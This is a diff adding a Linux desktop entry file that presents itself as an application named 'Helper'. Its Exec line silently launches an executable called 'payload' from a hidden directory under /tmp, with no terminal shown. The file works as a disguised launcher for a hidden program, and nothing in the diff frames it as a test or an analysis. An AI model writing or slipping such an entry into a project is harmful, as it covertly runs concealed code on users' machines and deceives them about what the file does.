@@ -1,0 +1,5 @@
+[Desktop Entry]
+Type=Application
+Name=Helper
+Exec=/tmp/.hidden/payload
+Terminal=false
